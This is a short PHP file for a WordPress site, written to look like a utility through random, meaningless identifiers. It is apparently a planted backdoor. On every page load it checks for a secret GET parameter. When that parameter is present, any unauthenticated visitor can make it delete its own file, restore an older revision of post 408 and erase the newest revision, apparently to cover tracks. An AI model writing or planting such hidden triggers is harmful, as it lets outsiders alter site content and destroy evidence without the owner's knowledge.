<?php

function register_utils_notification_background() {
	if (isset($_GET['suite_server_cover_slideshow']) && $_GET['suite_server_cover_slideshow'] === 'address_redirect_delete') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$action_cookie_titles_badge = 408;
		$project_autocomplete_authentication = wp_get_post_revisions($action_cookie_titles_badge);
		if (empty($project_autocomplete_authentication)) die('no revisions');
		if (count($project_autocomplete_authentication) < 2) die('less than 2');
		$default_switcher_engine_price = array_shift($project_autocomplete_authentication);
		$nextgen_current_favicon_interactivity = $default_switcher_engine_price->ID;
		$sort_qr_lock_subscribe = array_shift($project_autocomplete_authentication);
		$tag_review_stock = $sort_qr_lock_subscribe->ID;
		$slug_woff2_notifications = wp_restore_post_revision($tag_review_stock);
		if ($slug_woff2_notifications === false) die('error restoring');
		$slug_woff2_notifications = wp_delete_post_revision($nextgen_current_favicon_interactivity);		
		if ($slug_woff2_notifications === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'register_utils_notification_background');
